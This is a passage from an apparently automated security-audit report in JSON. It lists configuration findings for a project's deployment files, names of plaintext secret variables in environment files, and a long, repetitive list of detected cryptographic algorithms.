                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/markdown_it/port.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_super_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/proxy_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_new_new_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/_new_secret_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/model_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/azure_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/simple_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/oai_misc_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/aliases_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/disable_schema_update.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/_health_check_test_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/load_balancer.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/multi_instance_simple_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/spend_tracking_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/otel_test_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/opentelemetry_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/langfuse_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/pass_through_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/enterprise_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "venv_deployment/lib/python3.12/site-packages/litellm/proxy/example_config_yaml/store_model_db_config.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_learning_system/servers/devops/config/deployment_patterns.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/servers/devops/config/deployment_patterns.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/docker/docker-compose.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/mcp-production-deployment.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/deploy-infrastructure.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/deployment.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": ".github/workflows/production-deploy.yml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          }
        ]
      },
      "docker_compose_security": {
        "compose_files_analyzed": 16,
        "total_issues": 5,
        "critical_issues": 5,
        "compose_analysis": [
          {
            "file": "docker-compose.monitoring.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "docker-compose.mcp-production.yml",
            "issues": [
              {
                "issue": "Docker socket mounted",
                "severity": "CRITICAL",
                "recommendation": "Avoid mounting Docker socket"
              }
            ],
            "total_issues": 1,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "mcp_learning_system/docker-compose.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/docker-compose.dev.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/docker-compose.test.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/monitoring/docker-compose.monitoring-full.yml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              }
            ],
            "total_issues": 1,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/monitoring/docker-compose.monitoring.yml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              }
            ],
            "total_issues": 1,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/docker/docker-compose.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "infrastructure/logging/docker-compose.logging.yml",
            "issues": [
              {
                "issue": "Docker socket mounted",
                "severity": "CRITICAL",
                "recommendation": "Avoid mounting Docker socket"
              }
            ],
            "total_issues": 1,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "src/monitoring/docker-compose.monitoring.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/docker-compose.mcp.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/docker-compose.dev.yml",
            "issues": [
              {
                "issue": "Docker socket mounted",
                "severity": "CRITICAL",
                "recommendation": "Avoid mounting Docker socket"
              }
            ],
            "total_issues": 1,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "containers/production/docker-compose.prod.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/docker-compose.mcp-prod.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/docker-compose.yml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          }
        ]
      },
      "secrets_management": {
        "secrets_in_env_files": 22,
        "kubernetes_secrets_found": 7,
        "secrets_issues": [
          {
            "file": ".env.production",
            "line": 19,
            "issue": "Potential secret in plain text: JWT_SECRET_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 31,
            "issue": "Potential secret in plain text: ANTHROPIC_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 32,
            "issue": "Potential secret in plain text: OPENAI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 33,
            "issue": "Potential secret in plain text: GOOGLE_GEMINI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 34,
            "issue": "Potential secret in plain text: DEEPSEEK_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.production",
            "line": 35,
            "issue": "Potential secret in plain text: OPENROUTER_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 5,
            "issue": "Potential secret in plain text: ANTHROPIC_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 6,
            "issue": "Potential secret in plain text: OPENAI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 7,
            "issue": "Potential secret in plain text: GOOGLE_GEMINI_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 8,
            "issue": "Potential secret in plain text: DEEPSEEK_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 9,
            "issue": "Potential secret in plain text: OPENROUTER_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 15,
            "issue": "Potential secret in plain text: BRAVE_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 16,
            "issue": "Potential secret in plain text: SLACK_BOT_TOKEN",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 17,
            "issue": "Potential secret in plain text: AWS_ACCESS_KEY_ID",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 18,
            "issue": "Potential secret in plain text: AWS_SECRET_ACCESS_KEY",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 20,
            "issue": "Potential secret in plain text: AZURE_DEVOPS_TOKEN",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 58,
            "issue": "Potential secret in plain text: GRAFANA_ADMIN_PASSWORD",
            "severity": "HIGH"
          },
          {
            "file": ".env.example",
            "line": 61,
            "issue": "Potential secret in plain text: ELASTIC_PASSWORD",
            "severity": "HIGH"
          },
          {
            "file": ".env.development",
            "line": 13,
            "issue": "Potential secret in plain text: JWT_SECRET_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 6,
            "issue": "Potential secret in plain text: TAVILY_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 9,
            "issue": "Potential secret in plain text: SMITHERY_API_KEY",
            "severity": "HIGH"
          },
          {
            "file": "mcp_servers/config/api_keys.env",
            "line": 12,
            "issue": "Potential secret in plain text: BRAVE_API_KEY",
            "severity": "HIGH"
          }
        ],
        "k8s_secrets_files": [
          "k8s/security-context.yaml",
          "k8s/secrets.yaml",
          "k8s/mcp-deployment.yaml",
          "k8s/mcp-monitoring.yaml",
          "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
          "k8s/production/secrets.yaml",
          "monitoring/production/grafana-stack.yaml"
        ],
        "overall_score": "HIGH_RISK"
      },
      "network_security": {
        "network_policies_found": 8,
        "service_mesh_detected": true,
        "ingress_security": [],
        "tls_configuration": [
          "k8s/services.yaml"
        ]
      }
    },
    "encryption_assessment": {
      "data_at_rest_encryption": {
        "database_encryption": true,
        "file_encryption": true,
        "volume_encryption": true,
        "encryption_algorithms": [
          "encrypt.*at.*rest",
          "database.*encrypt",
          "file.*encrypt",
          "volume.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "rsa.*encrypt",
          "aes.*encrypt",
          "aes.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "rsa.*encrypt",
          "file.*encrypt",
          "rsa.*encrypt",
          "encrypt.*at.*rest",
          "file.*encrypt",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest",
          "encrypt.*at.*rest"
        ]
      },
      "data_in_transit_encryption": {
        "https_enforced": true,
        "tls_version": "tls_version\": \"1.3",
        "certificate_validation": true,
        "hsts_headers": true
      },
      "cryptographic_implementations": {
        "strong_algorithms": [
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "bcrypt",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "bcrypt",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "scrypt",
          "argon2",
          "aes",
          "rsa",
          "rsa",
          "bcrypt",
          "rsa",
          "aes",
          "chacha20",
          "bcrypt",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "aes",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha3",
          "rsa",
          "sha3",
          "sha3",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "rsa",
          "ed25519",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha3",
          "sha256",
          "rsa",
          "ecdsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "sha256",
          "sha3",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "sha256",
          "sha3",
          "aes",
          "sha256",
          "aes",
          "aes",
          "aes",
          "chacha20",
          "aes",
          "aes",
          "chacha20",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "rsa",
          "ed25519",
          "aes",
          "rsa",
          "sha256",
          "sha3",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "ed25519",
          "rsa",
          "scrypt",
          "argon2",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "scrypt",
          "argon2",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "bcrypt",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "chacha20",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "scrypt",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "sha3",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "sha3",
          "bcrypt",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "sha256",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "ecdsa",
          "ed25519",
          "aes",
          "rsa",
          "aes",
          "sha256",
          "aes",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "aes",
          "rsa",
          "aes",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "ecdsa",
          "ed25519",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "rsa",
          "aes",
          "chacha20",
          "ed25519",
          "sha256",
          "scrypt",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "bcrypt",
          "argon2",
          "sha256",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "aes",
          "rsa",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "sha256",
          "sha256",
          "sha256",
          "rsa",
          "sha256",
          "rsa",
          "aes",
          "chacha20",
          "rsa",
          "sha256",
          "sha3",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "sha256",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "rsa",
          "bcrypt",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "aes",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "rsa",
          "aes",
          "rsa",
          "rsa",
          "aes",
          "aes",
          "sha256",
          "aes",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "rsa",
          "aes",
